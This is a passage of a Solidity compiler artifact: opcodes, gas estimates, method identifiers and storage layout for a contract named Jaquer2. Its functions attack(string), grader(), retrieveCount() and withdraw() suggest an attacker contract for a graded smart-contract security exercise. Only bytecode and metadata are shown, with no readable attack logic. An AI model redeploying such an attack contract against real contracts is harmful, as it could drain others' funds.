JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x72B PUSH0 DUP4 ADD DUP5 PUSH2 0x709 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH0 DUP4 PUSH1 0x1F DUP5 ADD SLT PUSH2 0x752 JUMPI PUSH2 0x751 PUSH2 0x731 JUMP JUMPDEST JUMPDEST DUP3 CALLDATALOAD SWAP1 POP PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x76F JUMPI PUSH2 0x76E PUSH2 0x735 JUMP JUMPDEST JUMPDEST PUSH1 0x20 DUP4 ADD SWAP2 POP DUP4 PUSH1 0x1 DUP3 MUL DUP4 ADD GT ISZERO PUSH2 0x78B JUMPI PUSH2 0x78A PUSH2 0x739 JUMP JUMPDEST JUMPDEST SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH0 PUSH1 0x20 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x7A8 JUMPI PUSH2 0x7A7 PUSH2 0x540 JUMP JUMPDEST JUMPDEST PUSH0 DUP4 ADD CALLDATALOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x7C5 JUMPI PUSH2 0x7C4 PUSH2 0x544 JUMP JUMPDEST JUMPDEST PUSH2 0x7D1 DUP6 DUP3 DUP7 ADD PUSH2 0x73D JUMP JUMPDEST SWAP3 POP SWAP3 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH2 0x7E6 DUP2 PUSH2 0x498 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x7FF PUSH0 DUP4 ADD DUP5 PUSH2 0x7DD JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST DUP3 DUP2 DUP4 MCOPY PUSH0 DUP4 DUP4 ADD MSTORE POP POP POP JUMP JUMPDEST PUSH0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x837 DUP3 PUSH2 0x805 JUMP JUMPDEST PUSH2 0x841 DUP2 DUP6 PUSH2 0x5FA JUMP JUMPDEST SWAP4 POP PUSH2 0x851 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x80F JUMP JUMPDEST PUSH2 0x85A DUP2 PUSH2 0x81D JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x87D DUP2 DUP5 PUSH2 0x82D JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH1 0x20 PUSH1 0x1F DUP4 ADD DIV SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP3 DUP3 SHL SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x8 DUP4 MUL PUSH2 0x906 PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 PUSH2 0x8CB JUMP JUMPDEST PUSH2 0x910 DUP7 DUP4 PUSH2 0x8CB JUMP JUMPDEST SWAP6 POP DUP1 NOT DUP5 AND SWAP4 POP DUP1 DUP7 AND DUP5 OR SWAP3 POP POP POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH0 PUSH2 0x942 PUSH2 0x93D PUSH2 0x938 DUP5 PUSH2 0x498 JUMP JUMPDEST PUSH2 0x6BD JUMP JUMPDEST PUSH2 0x498 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x95B DUP4 PUSH2 0x928 JUMP JUMPDEST PUSH2 0x96F PUSH2 0x967 DUP3 PUSH2 0x949 JUMP JUMPDEST DUP5 DUP5 SLOAD PUSH2 0x8D7 JUMP JUMPDEST DUP3 SSTORE POP POP POP POP JUMP JUMPDEST PUSH0 PUSH0 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH2 0x986 PUSH2 0x977 JUMP JUMPDEST PUSH2 0x991 DUP2 DUP5 DUP5 PUSH2 0x952 JUMP JUMPDEST POP POP POP JUMP JUMPDEST JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0x9B4 JUMPI PUSH2 0x9A9 PUSH0 DUP3 PUSH2 0x97E JUMP JUMPDEST PUSH1 0x1 DUP2 ADD SWAP1 POP PUSH2 0x997 JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x1F DUP3 GT ISZERO PUSH2 0x9F9 JUMPI PUSH2 0x9CA DUP2 PUSH2 0x60A JUMP JUMPDEST PUSH2 0x9D3 DUP5 PUSH2 0x8BC JUMP JUMPDEST DUP2 ADD PUSH1 0x20 DUP6 LT ISZERO PUSH2 0x9E2 JUMPI DUP2 SWAP1 POP JUMPDEST PUSH2 0x9F6 PUSH2 0x9EE DUP6 PUSH2 0x8BC JUMP JUMPDEST DUP4 ADD DUP3 PUSH2 0x996 JUMP JUMPDEST POP POP JUMPDEST POP POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 SHR SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xA19 PUSH0 NOT DUP5 PUSH1 0x8 MUL PUSH2 0x9FE JUMP JUMPDEST NOT DUP1 DUP4 AND SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xA31 DUP4 DUP4 PUSH2 0xA0A JUMP JUMPDEST SWAP2 POP DUP3 PUSH1 0x2 MUL DUP3 OR SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0xA4B DUP4 DUP4 PUSH2 0x885 JUMP JUMPDEST PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0xA64 JUMPI PUSH2 0xA63 PUSH2 0x88F JUMP JUMPDEST JUMPDEST PUSH2 0xA6E DUP3 SLOAD PUSH2 0x5CA JUMP JUMPDEST PUSH2 0xA79 DUP3 DUP3 DUP6 PUSH2 0x9B8 JUMP JUMPDEST PUSH0 PUSH1 0x1F DUP4 GT PUSH1 0x1 DUP2 EQ PUSH2 0xAA6 JUMPI PUSH0 DUP5 ISZERO PUSH2 0xA94 JUMPI DUP3 DUP8 ADD CALLDATALOAD SWAP1 POP JUMPDEST PUSH2 0xA9E DUP6 DUP3 PUSH2 0xA26 JUMP JUMPDEST DUP7 SSTORE POP PUSH2 0xB05 JUMP JUMPDEST PUSH1 0x1F NOT DUP5 AND PUSH2 0xAB4 DUP7 PUSH2 0x60A JUMP JUMPDEST PUSH0 JUMPDEST DUP3 DUP2 LT ISZERO PUSH2 0xADB JUMPI DUP5 DUP10 ADD CALLDATALOAD DUP3 SSTORE PUSH1 0x1 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP6 ADD SWAP5 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0xAB6 JUMP JUMPDEST DUP7 DUP4 LT ISZERO PUSH2 0xAF8 JUMPI DUP5 DUP10 ADD CALLDATALOAD PUSH2 0xAF4 PUSH1 0x1F DUP10 AND DUP3 PUSH2 0xA0A JUMP JUMPDEST DUP4 SSTORE POP JUMPDEST PUSH1 0x1 PUSH1 0x2 DUP9 MUL ADD DUP9 SSTORE POP POP POP JUMPDEST POP POP POP POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 MUL EXTCODECOPY 0xBB SELFBALANCE 0xE2 ADD PUSH24 0x72EAC73C0A94D9D60BFC868D37886B9C7EE24BC447A7A396 PUSH30 0x64736F6C634300081E003300000000000000000000000000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "576800",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"": "infinite",
						"attack(string)": "infinite",
						"grader()": "infinite",
						"retrieveCount()": "2469",
						"targetName()": "infinite",
						"withdraw()": "infinite"
					}
				},
				"methodIdentifiers": {
					"attack(string)": "aabb7554",
					"grader()": "5bc05526",
					"retrieveCount()": "f2ceb75f",
					"targetName()": "fdfd5917",
					"withdraw()": "3ccfd60b"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 20,
						"contract": "jaquer2.sol:Jaquer2",
						"label": "grader",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(IGrader5)17"
					},
					{
						"astId": 22,
						"contract": "jaquer2.sol:Jaquer2",
						"label": "targetName",
						"offset": 0,
						"slot": "1",
						"type": "t_string_storage"
					},
					{
						"astId": 24,
						"contract": "jaquer2.sol:Jaquer2",
						"label": "retrieveCount",
						"offset": 0,
						"slot": "2",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_contract(IGrader5)17": {
						"encoding": "inplace",
						"label": "contract IGrader5",
						"numberOfBytes": "20"
					},
					"t_string_storage": {
						"encoding": "bytes",
						"label": "string",
						"numberOfBytes": "32"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}